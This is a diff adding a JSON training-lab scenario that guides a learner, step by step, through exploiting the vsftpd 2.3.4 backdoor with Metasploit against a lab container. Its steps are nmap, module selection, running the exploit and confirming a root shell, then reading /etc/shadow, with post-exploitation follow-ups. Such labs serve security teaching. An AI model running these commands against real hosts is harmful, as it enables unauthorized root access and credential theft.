@@ -1,0 +1,69 @@
+{
+  "id": "vsftpd-backdoor",
+  "name": "FTP Backdoor Exploit",
+  "difficulty": "easy",
+  "container": "vsftpd",
+  "ip": "172.20.0.15",
+  "port": 21,
+  "short_description": "Exploit the famous vsftpd 2.3.4 backdoor for instant root access.",
+  "description": "In 2011, an attacker inserted a backdoor into vsftpd 2.3.4's source code. When a username contains ':)' (smiley face), it opens a shell on port 6200. This is CVE-2011-2523 and one of the easiest exploits to learn with Metasploit.",
+  "steps": [
+    {
+      "title": "Verify the target is running",
+      "command": "nmap -sV 172.20.0.15 -p 21",
+      "explanation": "This scans port 21 (FTP) and identifies the service version. Look for 'vsftpd 2.3.4'.",
+      "expected": "You should see: 21/tcp open ftp vsftpd 2.3.4"
+    },
+    {
+      "title": "Start Metasploit",
+      "command": "msfconsole -q",
+      "explanation": "The -q flag skips the banner for faster startup. Wait for the msf6 > prompt."
+    },
+    {
+      "title": "Search for the exploit",
+      "command": "search vsftpd",
+      "explanation": "This searches Metasploit's database for vsftpd-related modules.",
+      "expected": "You'll see exploit/unix/ftp/vsftpd_234_backdoor in the results"
+    },
+    {
+      "title": "Load the exploit module",
+      "command": "use exploit/unix/ftp/vsftpd_234_backdoor",
+      "explanation": "This loads the backdoor exploit. Your prompt changes to show the active module."
+    },
+    {
+      "title": "View module options",
+      "command": "show options",
+      "explanation": "See what parameters the exploit needs. RHOSTS is the target IP.",
+      "expected": "You'll see RHOSTS is required and currently empty"
+    },
+    {
+      "title": "Set the target",
+      "command": "set RHOSTS 172.20.0.15",
+      "explanation": "This tells Metasploit which host to attack."
+    },
+    {
+      "title": "Execute the exploit",
+      "command": "run",
+      "explanation": "This triggers the backdoor and opens a shell session.",
+      "expected": "[*] Command shell session 1 opened"
+    },
+    {
+      "title": "Verify root access",
+      "command": "whoami",
+      "explanation": "In your new shell, check who you are.",
+      "expected": "root"
+    },
+    {
+      "title": "Explore the system",
+      "command": "id && cat /etc/shadow | head -3",
+      "explanation": "Confirm you're root (uid=0) and can read sensitive files.",
+      "expected": "uid=0(root) and shadow file contents"
+    }
+  ],
+  "success_criteria": "You have a command shell session and 'whoami' returns 'root'. You now have complete control of the target system.",
+  "next_steps": [
+    "Try 'sessions -l' to list active sessions",
+    "Use 'sessions -u 1' to upgrade to Meterpreter",
+    "Explore post-exploitation modules with 'search post/linux'"
+  ]
+}
